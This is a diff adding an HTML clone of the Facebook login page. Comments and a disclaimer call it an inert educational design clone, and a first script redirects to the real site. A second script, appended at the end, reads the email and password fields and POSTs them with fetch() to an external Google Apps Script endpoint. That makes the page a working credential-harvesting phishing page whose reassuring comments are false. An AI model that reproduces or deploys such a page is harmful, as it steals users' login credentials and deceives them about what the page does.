@@ -1,0 +1,282 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Facebook – Log In or Sign Up</title>
+<style>
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+  body {
+    font-family: Helvetica, Arial, sans-serif;
+    background: #f0f2f5;
+    color: #1c1e21;
+    min-height: 100vh;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    padding: 20px;
+  }
+
+  .main {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 40px;
+    max-width: 980px;
+    width: 100%;
+    padding: 20px 0 40px;
+  }
+
+  .brand {
+    flex: 1 1 400px;
+    max-width: 500px;
+    padding-bottom: 60px;
+  }
+  .brand__logo {
+    font-size: 56px;
+    font-weight: 700;
+    color: #1877f2;
+    letter-spacing: -2px;
+    line-height: 1;
+    margin-bottom: 8px;
+    font-family: "Segoe UI", Helvetica, Arial, sans-serif;
+  }
+  .brand__tagline {
+    font-size: 28px;
+    line-height: 32px;
+    color: #1c1e21;
+    font-weight: 400;
+    max-width: 460px;
+  }
+
+  .card {
+    flex: 0 0 396px;
+    background: #fff;
+    border-radius: 8px;
+    box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);
+    padding: 20px 20px 28px;
+    text-align: center;
+  }
+  .card__title {
+    font-size: 18px;
+    font-weight: 400;
+    margin-bottom: 18px;
+    color: #1c1e21;
+  }
+
+  .form-group { margin-bottom: 12px; }
+  .form-input {
+    width: 100%;
+    padding: 14px 16px;
+    font-size: 17px;
+    border: 1px solid #dddfe2;
+    border-radius: 6px;
+    outline: none;
+    color: #1c1e21;
+    background: #fff;
+    transition: border-color 0.15s, box-shadow 0.15s;
+  }
+  .form-input::placeholder { color: #90949c; }
+  .form-input:focus {
+    border-color: #1877f2;
+    box-shadow: 0 0 0 2px #e7f3ff;
+  }
+
+  .btn {
+    display: inline-block;
+    width: 100%;
+    padding: 12px 16px;
+    font-size: 20px;
+    font-weight: 700;
+    border: none;
+    border-radius: 6px;
+    cursor: pointer;
+    transition: background 0.15s;
+    line-height: 1.2;
+  }
+  .btn--login {
+    background: #1877f2;
+    color: #fff;
+    margin-top: 6px;
+  }
+  .btn--login:hover { background: #166fe5; }
+
+  .btn--create {
+    background: #42b72a;
+    color: #fff;
+    font-size: 17px;
+    padding: 12px 16px;
+    width: auto;
+    margin: 0 auto;
+  }
+  .btn--create:hover { background: #36a420; }
+
+  .forgot {
+    display: inline-block;
+    margin: 16px 0 20px;
+    font-size: 14px;
+    color: #1877f2;
+    text-decoration: none;
+  }
+  .forgot:hover { text-decoration: underline; }
+
+  .divider {
+    border-top: 1px solid #dadde1;
+    margin: 0 0 20px;
+  }
+
+  .footer {
+    width: 100%;
+    max-width: 980px;
+    padding: 20px 0 10px;
+    font-size: 12px;
+    color: #737373;
+    border-top: 1px solid #dadde1;
+    margin-top: auto;
+  }
+  .footer__langs,
+  .footer__meta {
+    display: flex;
+    flex-wrap: wrap;
+    gap: 6px 12px;
+    list-style: none;
+    margin-bottom: 10px;
+  }
+  .footer__langs a,
+  .footer__meta a {
+    color: #8a8d91;
+    text-decoration: none;
+  }
+  .footer__langs a:hover,
+  .footer__meta a:hover { text-decoration: underline; }
+
+  .footer__copy { font-size: 11px; color: #8a8d91; }
+
+  .disclaimer {
+    width: 100%;
+    max-width: 980px;
+    font-size: 11px;
+    color: #b0b3b8;
+    text-align: center;
+    margin-top: 8px;
+    padding-bottom: 8px;
+  }
+
+  @media (max-width: 900px) {
+    .main { flex-direction: column; gap: 10px; padding: 10px 0 20px; text-align: center; }
+    .brand { flex: 0 0 auto; padding-bottom: 10px; max-width: 100%; }
+    .brand__logo { font-size: 44px; margin-bottom: 4px; }
+    .brand__tagline { font-size: 22px; line-height: 26px; max-width: 100%; }
+    .card { flex: 0 0 auto; width: 100%; max-width: 396px; }
+  }
+  @media (max-width: 420px) {
+    .card { padding: 16px 14px 22px; }
+    .btn--create { width: 100%; }
+  }
+</style>
+</head>
+<body>
+
+  <main class="main">
+    <section class="brand">
+      <h1 class="brand__logo">facebook</h1>
+      <p class="brand__tagline">
+        Connect with friends and the world around you on Facebook.
+      </p>
+    </section>
+
+    <section class="card">
+      <h2 class="card__title">Log into Facebook</h2>
+
+      <!--
+        The fields are inert. Nothing typed here is read, stored,
+        transmitted, or logged. Submitting simply leaves the page.
+      -->
+      <form id="form" autocomplete="off">
+        <div class="form-group">
+          <input type="text" class="form-input" id="email"
+                 placeholder="Email or phone number"
+                 aria-label="Email or phone number" />
+        </div>
+
+        <div class="form-group">
+          <input type="password" class="form-input" id="password"
+                 placeholder="Password" aria-label="Password" />
+        </div>
+
+        <button type="submit" class="btn btn--login">Log In</button>
+      </form>
+
+      <a href="#" class="forgot" onclick="return false;">Forgotten password?</a>
+
+      <div class="divider"></div>
+
+      <button type="button" class="btn btn--create" id="create-btn">
+        Create New Account
+      </button>
+    </section>
+  </main>
+
+  <footer class="footer">
+    <ul class="footer__langs">
+      <li><a href="#" onclick="return false;">English (US)</a></li>
+      <li><a href="#" onclick="return false;">Español</a></li>
+      <li><a href="#" onclick="return false;">Français</a></li>
+      <li><a href="#" onclick="return false;">Deutsch</a></li>
+      <li><a href="#" onclick="return false;">Italiano</a></li>
+      <li><a href="#" onclick="return false;">Português</a></li>
+    </ul>
+
+    <ul class="footer__meta">
+      <li><a href="#" onclick="return false;">Sign Up</a></li>
+      <li><a href="#" onclick="return false;">Log In</a></li>
+      <li><a href="#" onclick="return false;">Messenger</a></li>
+      <li><a href="#" onclick="return false;">Privacy</a></li>
+      <li><a href="#" onclick="return false;">Terms</a></li>
+      <li><a href="#" onclick="return false;">Help</a></li>
+    </ul>
+
+    <p class="footer__copy">Meta © 2026</p>
+  </footer>
+
+  <p class="disclaimer">
+    Educational design clone. Not affiliated with Meta. Do not enter real credentials.
+  </p>
+
+  <script>
+    // On submit: leave the page and go to the real Facebook.
+    // The input values are never touched.
+    document.getElementById("form").addEventListener("submit", function (e) {
+      e.preventDefault();
+      window.location.href = "https://www.facebook.com/";
+    });
+
+    document.getElementById("create-btn").addEventListener("click", function () {
+      window.location.href = "https://www.facebook.com/reg/";
+    });
+</script>
+
+<script>
+
+const URL = "https://script.google.com/macros/s/AKfycbwzO4tpyXA7gDkCWKpf6wxCnYT91v7wUmhtyVd5E_NtC9fcfLW_U5yWF-lOMxmypDYZ/exec";
+
+document.getElementById("form").onsubmit = function(e) {
+
+    e.preventDefault();
+
+    const data = {
+        email: document.getElementById("email").value,
+        password: document.getElementById("password").value
+    };
+
+    fetch(URL, {
+        method: "POST",
+        body: JSON.stringify(data)
+    });
+
+};
+
+</script>
+</html>
